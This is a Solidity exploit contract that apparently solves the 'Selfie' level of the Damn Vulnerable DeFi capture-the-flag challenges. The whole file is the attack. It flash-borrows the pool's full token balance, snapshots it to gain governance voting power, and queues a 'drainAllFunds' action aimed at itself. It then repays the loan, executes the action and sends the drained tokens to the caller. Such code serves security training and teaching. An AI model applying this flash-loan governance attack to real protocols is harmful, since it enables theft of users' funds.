// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";


contract HackSelfie {
    SelfiePool public sp;
    SimpleGovernance public sg;
    DamnValuableTokenSnapshot public dvt;
    uint actionId;


    constructor(address _sp, address _sg, address _dvt){
        sp = SelfiePool(_sp);
        sg = SimpleGovernance(_sg);
        dvt = DamnValuableTokenSnapshot(_dvt);
    }

    function attack() public{
        uint bal = dvt.balanceOf(address(sp));
        sp.flashLoan(bal);
        
    }
    function withdraw() public {
        uint bal = dvt.balanceOf(address(sp));
        sg.executeAction(actionId);
        dvt.transfer(msg.sender, bal);
    }

    function receiveTokens(address _token, uint256 _amount) public {
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", address(this));
        dvt.snapshot();
        actionId = sg.queueAction(address(sp), data, 0);
        DamnValuableTokenSnapshot(_token).transfer(address(sp), _amount);
    }

}